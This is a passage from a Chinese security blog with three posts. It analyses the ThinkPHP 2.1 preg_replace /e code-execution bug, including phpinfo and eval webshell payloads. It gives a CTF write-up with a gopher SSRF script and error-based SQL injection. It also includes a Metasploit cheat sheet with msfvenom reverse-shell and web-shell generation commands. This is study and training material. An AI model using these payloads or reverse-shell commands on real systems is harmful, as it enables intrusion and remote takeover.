__APP__.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$module</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 当前操作地址</span></span><br><span class="line">    define(<span class="string">&#x27;__ACTION__&#x27;</span>,__URL__.<span class="variable">$depr</span>.ACTION_NAME);</span><br><span class="line">    <span class="comment">//保证$_REQUEST正常取值</span></span><br><span class="line">    <span class="variable">$_REQUEST</span> = array_merge(<span class="variable">$_POST</span>,<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>路由控制这块重点应该是这串代码，所以重点看下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (C(<span class="string">&#x27;APP_GROUP_LIST&#x27;</span>) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[C(<span class="string">&#x27;VAR_GROUP&#x27;</span>)]))&#123;</span><br><span class="line">                <span class="variable">$var</span>[C(<span class="string">&#x27;VAR_GROUP&#x27;</span>)] = in_array(strtolower(<span class="variable">$paths</span>[<span class="number">0</span>]),explode(<span class="string">&#x27;,&#x27;</span>,strtolower(C(<span class="string">&#x27;APP_GROUP_LIST&#x27;</span>))))? array_shift(<span class="variable">$paths</span>) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这一段代码是对分组进行处理首先判断是否有分组，默认是否能从分组获取变量。$paths=explode( $depr,trim( $_SERVER[‘PATH_INFO’],’/‘)); $_SERVER[‘PATH_INFO’]是返回用户查询语句查询的真实脚本后面的url真实路径<br>比如<a target="_blank" rel="noopener" href="http://127.0.0.1/1/url.php/test/test/1.php?test=123%E8%BF%99%E7%A7%8D%E6%A0%BC%E5%BC%8F%E4%BC%9A%E8%BF%94%E5%9B%9Eurl.php%E5%90%8E%E9%9D%A2%E7%9A%84%E8%B7%AF%E5%BE%84%E4%B9%9F%E5%B0%B1%E6%98%AF/test/test/1.php%E3%80%82">http://127.0.0.1/1/url.php/test/test/1.php?test=123这种格式会返回url.php后面的路径也就是/test/test/1.php。</a><br>而之前 $depr = C(‘URL_PATHINFO_DEPR’); C(‘URL_PATHINFO_DEPR’)是PATHINFO模式下的分割符号。</p>
<p>所以这段代码本地测试了一下经过exlode处理后上面那段url的返回值是<br>Array ([0] =&gt; [1] =&gt; test [2] =&gt; test [3] =&gt; 1.php)<br>array_shift是去除数组的开头单元。那么$var最后的值是去除了[0]这单元的数组或者为空。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$res</span> = preg_replace(<span class="string">&#x27;@(\w+)&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;([^&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;\/]+)@e&#x27;</span>, <span class="string">&#x27;$var[\&#x27;\\1\&#x27;]=&quot;\\2&quot;;&#x27;</span>, implode(<span class="variable">$depr</span>,<span class="variable">$paths</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>  该代码块首先检测路由规则，如果没有制定规则则按照默认规则进行URL调度，在preg_replace()函数中，正则表达式中使用了/e模式，将“替换字符串”作为PHP代码求值，并用其结果来替换所搜索的字符串。<br>正则表达式可以简化为“\w+/([^/])”，即搜索获取“/”前后的两个参数，$var[‘\1’]=”\2”;是对数组的操作，将之前搜索到的第一个值作为新数组的键，将第二个值作为新数组的值，我们发现可以构造搜索到的第二个值，即可执行任意PHP代码，在PHP中，我们可以使用${}里面可以执行函数，然后我们在thinkphp的url中的偶数位置使用${}格式的php代码，即可最终执行thinkphp任意代码执行漏洞</p>
<p>这一段就是thinkphp2.1命令执行的问题所在了，看看这段代码到底做了什么。<br>这里其实是因为preg_replace \e修饰符的问题，这个修饰符会把第二个参数当成php代码执行。简单结合上面的语句来说就是$ var[‘\1’]=”\2”;它把这个当成了一个回调函数，而1和2是implode($ depr,$paths)执行结果来代替。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$depr</span>=<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="variable">$paths</span> = explode(<span class="variable">$depr</span>,trim(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>],<span class="string">&#x27;/&#x27;</span>));</span><br><span class="line"><span class="variable">$var</span>=<span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$res</span>= preg_replace(<span class="string">&#x27;@(\w+)&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;([^&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;\/]+)@e&#x27;</span>,<span class="string">&#x27;$var[\&#x27;\\1\&#x27;]=&quot;\\2&quot;;&#x27;</span>, implode(<span class="variable">$depr</span>,<span class="variable">$paths</span>));</span><br><span class="line">print_r(<span class="variable">$var</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>当输入<a target="_blank" rel="noopener" href="http://127.0.0.1/html/1.php/module/%7B@phpinfo()%7D">http://127.0.0.1/html/1.php/module/%7B@phpinfo()%7D</a><br>这种url时会打印出Array ( [module] =&gt; {@phpinfo()} )<br><img src="https://img-blog.csdnimg.cn/dc9d2872af2c4f8fa7090a795bbe7f50.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>当输入<a target="_blank" rel="noopener" href="http://127.0.0.1/html/module/%7B@phpinfo()%7D%E6%97%B6%E4%BC%9A%E6%89%A7%E8%A1%8Cphpinfo()">http://127.0.0.1/html/module/{@phpinfo()}时会执行phpinfo()</a><br>本地做测试</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="string">&quot;$&#123;@phpinfo()&#125;;&quot;</span>,<span class="number">1</span>=&gt;<span class="string">&#x27;b&#x27;</span>,<span class="number">2</span>=&gt;<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line">    print_r(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>得到<br><img src="https://img-blog.csdnimg.cn/05453706db6c4348b058e94019cb5ded.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>这样写phpinfo()是可以执行成功的。然后把中间的代码改成了<br>$ a=array(0=&gt;”$ {@eval($_POST[s])};”,1=&gt;’b’,2=&gt;’c’)。<br>仔细想想其实因为数组赋值的问题，你用$标识一个变量之后，他是把变量的值赋给0所以就会导致执行。</p>
<p>而这个漏洞的利用格式为什么必须是index.php/xxx/xxx/xxx/${@phpinfo()}<br>是因为这里还是在这个文件，214到224行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$routes</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$route</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="number">0</span> === stripos(<span class="variable">$regx</span>.<span class="variable">$depr</span>,<span class="variable">$route</span>[<span class="number">0</span>].<span class="variable">$depr</span>)) &#123;</span><br><span class="line">                    <span class="comment">// 简单路由定义：array(&#x27;路由定义&#x27;,&#x27;分组/模块/操作名&#x27;, &#x27;路由对应变量&#x27;,&#x27;额外参数&#x27;),</span></span><br><span class="line">                    <span class="variable">$var</span>  =  <span class="built_in">self</span>::parseUrl(<span class="variable">$route</span>[<span class="number">1</span>]);</span><br><span class="line">                    <span class="comment">//  获取当前路由参数对应的变量</span></span><br><span class="line">                    <span class="variable">$paths</span> = explode(<span class="variable">$depr</span>,trim(str_ireplace(<span class="variable">$route</span>[<span class="number">0</span>].<span class="variable">$depr</span>,<span class="variable">$depr</span>,<span class="variable">$regx</span>),<span class="variable">$depr</span>));</span><br><span class="line">                    <span class="variable">$vars</span>    =   explode(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$route</span>[<span class="number">2</span>]);</span><br><span class="line">                    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;count(<span class="variable">$vars</span>);<span class="variable">$i</span>++)</span><br><span class="line">                        <span class="variable">$var</span>[<span class="variable">$vars</span>[<span class="variable">$i</span>]]     =   array_shift(<span class="variable">$paths</span>);</span><br><span class="line">                    <span class="comment">// 解析剩余的URL参数</span></span><br><span class="line">                    <span class="variable">$res</span> = preg_replace(<span class="string">&#x27;@(\w+)\/([^,\/]+)@e&#x27;</span>, <span class="string">&#x27;$var[\&#x27;\\1\&#x27;]=&quot;\\2&quot;;&#x27;</span>, implode(<span class="string">&#x27;/&#x27;</span>,<span class="variable">$paths</span>));</span><br></pre></td></tr></table></figure>
<p>thinkphp路由的格式是分组/模块/操作名/参数。而参数是被带入执行的。以这种格式传入的会执行命令。</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangshuwin/p/7607120.html">转载自大佬博客</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/05/07/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E5%88%83%E6%9D%AFweb/">第二届网刃杯web部分</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-05-07</time><div class="content"><h2 id="Sign-in"><a href="#Sign-in" class="headerlink" title="Sign_in"></a>Sign_in</h2><p>一道SSRF<br><img src="https://img-blog.csdnimg.cn/ebc028637faf45fc821017dd2db8fbf3.png"><br>看大佬博客发现查看网络情况<br>（学到了，学到了）<br><img src="https://img-blog.csdnimg.cn/f3abe6f299b249cda5eb2675a46d06eb.png"><br>发现100这个ip有不同<br>访问<br><img src="https://img-blog.csdnimg.cn/dd10c285d71a402bbb3ea2c2509b2bf3.png"><br>随便传过去一个a，b看大佬博客发现利用exp<br>(利用gopher发送http请求)<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/112055947">gopher详解</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">payload =\</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">POST /?a=1 HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 172.73.23.100</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 3</span></span><br><span class="line"><span class="string">X-Forwarded-For: 127.0.0.1</span></span><br><span class="line"><span class="string">Referer: bolean.club</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">b=1</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>  </span><br><span class="line">tmp = urllib.parse.quote(payload)<span class="comment">#对payload进行url编码</span></span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;?url=gopher://172.73.26.100:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line">result = urllib.parse.quote(result)</span><br><span class="line"><span class="built_in">print</span>(result)       <span class="comment"># 因为是GET请求所以要进行两次url编码</span></span><br></pre></td></tr></table></figure>
<p>得到路径访问</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher%3A//<span class="number">172.73</span><span class="number">.26</span><span class="number">.100</span>%3A80/_%250D%250APOST%<span class="number">2520</span>/%253Fa%253D1%2520HTTP/<span class="number">1.1</span>%250D%250AHost%253A%<span class="number">2520172.73</span><span class="number">.26</span><span class="number">.100</span>%250D%250AContent-<span class="type">Type</span>%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%<span class="number">25203</span>%250D%250AX-Forwarded-For%253A%<span class="number">2520127.0</span><span class="number">.0</span><span class="number">.1</span>%250D%250AReferer%253A%2520bolean.club%250D%250A%250D%250Ab%253D1%250D%250A</span><br></pre></td></tr></table></figure>
<p>最后得到flag</p>
<h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>打开题目，上传文件，发现php无法上传，于是上传一个txt文件报错<br><img src="https://img-blog.csdnimg.cn/4b19320c543d43aa8691bd3e717e2a24.png"><br>修改type为ctf上传成功<br>题目提示与sql有关，尝试在filename加个单引号（逐个尝试）<br>发现报错<br><img src="https://img-blog.csdnimg.cn/ff7c8e7c9c01499d9f5573a1bf6ca7c9.png"><br>推测为报错注入<br>先报库</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span>(select extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select database()))))</span><br></pre></td></tr></table></figure>
<p>没显示，<br><img src="https://img-blog.csdnimg.cn/4d5816c3bc794a75b7a07df68dc224c5.png"><br>有回显了<br><img src="https://img-blog.csdnimg.cn/0d270d618f0d43959a8540a4603edc7a.png"><br>接着报表，报端<br>发现不行（由于文件名字长度有限制）<br>盲猜一下<br><img src="https://img-blog.csdnimg.cn/e77e9da6dd9a480c88093e46f6959049.png"><br>仅出现一部分，利用substr函数<br><img src="https://img-blog.csdnimg.cn/044f4f4f4f1a4f748bde60dc7ea11cc1.png"><br>得到flag<br>由于在进行注入时总是多一个），看大佬博客发现<br>主页源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;ç®€å•ä¸Šä¼ &lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;upfile&quot;</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;ä¸Šä¼ &quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    ini_set(<span class="string">&#x27;display_errors&#x27;</span>,<span class="number">1</span>);        </span><br><span class="line">    ini_set(<span class="string">&#x27;display_startup_errors&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">    error_reporting(-<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">    <span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="variable">$password</span> = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">    <span class="variable">$dbname</span> = <span class="string">&quot;upload&quot;</span>;</span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">    <span class="variable">$conn</span> = mysqli_connect(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>))&#123;</span><br><span class="line">        <span class="variable">$filename_hz</span> = explode(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$name</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span> ,<span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="variable">$filename_</span> = end(<span class="variable">$filename_hz</span>);</span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$filename_</span>, <span class="variable">$name</span>) || <span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&quot;ctf&quot;</span>)&#123;</span><br><span class="line">            <span class="variable">$tmpname</span>   = <span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$name</span>      = <span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">            <span class="variable">$file_name</span> = md5(date(<span class="string">&#x27;YmdHis&#x27;</span>).rand(<span class="number">100</span>,<span class="number">999</span>).<span class="variable">$name</span>).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$filename_</span>;</span><br><span class="line">            <span class="variable">$sql</span> = <span class="string">&quot;insert into upload_file values(&#x27;<span class="subst">$file_name</span>&#x27;);&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>))&#123;</span><br><span class="line">                <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>, <span class="string">&#x27;./upload/&#x27;</span>.<span class="variable">$file_name</span>))&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="variable">$name</span>.<span class="string">&quot;&quot;</span>.<span class="string">&quot;/upload/<span class="subst">$file_name</span>&quot;</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="variable">$name</span>.<span class="string">&quot; &quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$sql</span> . <span class="string">&quot;&lt;br&gt;&quot;</span> . mysqli_error(<span class="variable">$conn</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;............ctf&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>需要）来闭合。<br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1630134">报错注入</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/04/05/MSF%E5%A4%87%E5%BF%98%E5%BD%95/">MSF备忘录</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-04-05</time><div class="content"><h2 id="1-安装运行及初始化"><a href="#1-安装运行及初始化" class="headerlink" title="1. 安装运行及初始化"></a>1. 安装运行及初始化</h2><p>安装</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 安装</span><br><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</span><br><span class="line"></span><br><span class="line"># 安装完成后位置</span><br><span class="line"># /opt/metasploit-framework/embedded/framework/</span><br><span class="line"></span><br><span class="line"># 目录结构 </span><br><span class="line">--modules 重点看这里就行了</span><br><span class="line">  --auxiliary 主要包含辅助性脚本(扫描、嗅探、注入、爆破，漏洞挖掘)</span><br><span class="line">  --encoders 主要包含各种编码工具，以便绕过入侵检测和过滤系统</span><br><span class="line">  --exploits 漏洞利用，包含主流的漏洞利用脚本，exp命名规则:系统/服务/模块</span><br><span class="line">  --nops 绕过针对溢出攻击滑行字符串的拦截检测</span><br><span class="line">  --payloads 攻击荷载，主要在目标机器执行代码</span><br><span class="line">  --post 此目录放着msf的exploit执行成功后，向目标发送的一些功能性指令，如提权，获取hash等</span><br><span class="line">  --evasion 新增，用来生成免杀payload，类似于集成msfvenom功能</span><br><span class="line">--data 放了meterpreter ，passiveX，vnc，DLLs，等这些工具和一些用户接口代码，msfweb 和一些其他模块用到的数据文件</span><br><span class="line">--plugins 这里的模块用户需要load来加载，提供数据库连接插件和各种要用到的插件</span><br><span class="line">--scripts 这个目录下的文件大都是meterpreter这个模块利用的脚本，比如用到migrate来转移到其他进程的指令的源代码就在此</span><br><span class="line">--tools 包含一些有用的脚本和零散的工具</span><br></pre></td></tr></table></figure>

<p>启动</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 运行</span><br><span class="line">$ msfconsole</span><br><span class="line"># 初始化数据库</span><br><span class="line">$ msfdb init</span><br><span class="line"># 重建缓存</span><br><span class="line">$ db_rebuild_cache</span><br><span class="line"># 查看数据库连接情况</span><br><span class="line">$ db_status</span><br></pre></td></tr></table></figure>

<h2 id="2-msf基本命令"><a href="#2-msf基本命令" class="headerlink" title="2. msf基本命令"></a>2. msf基本命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">show exploits – 查看所有可用的渗透攻击程序代码 </span><br><span class="line">show auxiliary – 查看所有可用的辅助攻击工具 </span><br><span class="line">show options – 查看该模块所有可用选项 </span><br><span class="line">show payloads – 查看该模块适用的所有载荷代码 </span><br><span class="line">show targets – 查看该模块适用的攻击目标类型</span><br><span class="line">search – 根据关键字搜索某模块 </span><br><span class="line">info – 显示某模块的详细信息 </span><br><span class="line">use – 进入使用某渗透攻击模块 </span><br><span class="line">back – 回退 </span><br><span class="line">set/unset – 设置/禁用模块中的某个参数 </span><br><span class="line">setg/unsetg – 设置/禁用适用于所有模块的全局参数 </span><br><span class="line">save – 将当前设置值保存下来，以便下次启动MSF终端时仍可使用</span><br></pre></td></tr></table></figure>

<h2 id="3-msfvenom生成payload"><a href="#3-msfvenom生成payload" class="headerlink" title="3 msfvenom生成payload"></a>3 msfvenom生成payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-p, --payload    &lt;payload&gt;       指定需要使用的payload(攻击荷载)</span><br><span class="line">-l, --list       [module_type]   列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all</span><br><span class="line">-n, --nopsled    &lt;length&gt;        为payload预先指定一个NOP滑动长度</span><br><span class="line">-f, --format     &lt;format&gt;        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)</span><br><span class="line">-e, --encoder    [encoder]       指定需要使用的encoder（编码器）</span><br><span class="line">-a, --arch       &lt;architecture&gt;  指定payload的目标架构</span><br><span class="line">    --platform   &lt;platform&gt;      指定payload的目标平台</span><br><span class="line">-s, --space      &lt;length&gt;        设定有效攻击荷载的最大长度</span><br><span class="line">-b, --bad-chars  &lt;list&gt;          设定规避字符集，比如: &amp;#039;\x00\xff&amp;#039;</span><br><span class="line">-i, --iterations &lt;count&gt;         指定payload的编码次数</span><br><span class="line">-c, --add-code   &lt;path&gt;          指定一个附加的win32 shellcode文件</span><br><span class="line">-x, --template   &lt;path&gt;          指定一个自定义的可执行文件作为模板</span><br><span class="line">-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行</span><br><span class="line">    --payload-options            列举payload的标准选项</span><br><span class="line">-o, --out   &lt;path&gt;               保存payload</span><br><span class="line">-v, --var-name &lt;name&gt;            指定一个自定义的变量，以确定输出格式</span><br><span class="line">    --shellest                   最小化生成payload</span><br><span class="line">-h, --help                       查看帮助选项</span><br><span class="line">    --help-formats               查看msf支持的输出格式列表</span><br></pre></td></tr></table></figure>

<p>1.可执行程序</p>
<p>Linux</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">反向连接：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line">正向连接：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=&lt;Target IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>

<p>Windows</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>

<p>Mac</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure>

<p>执行方式：直接复制可执行程序到目标机器上执行就行了。</p>
<p>2.Web Payloads</p>
<p>PHP</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo &#x27;&lt;?php &#x27; | tr -d &#x27;\n&#x27; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>

<p>ASP</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>

<p>JSP</p>
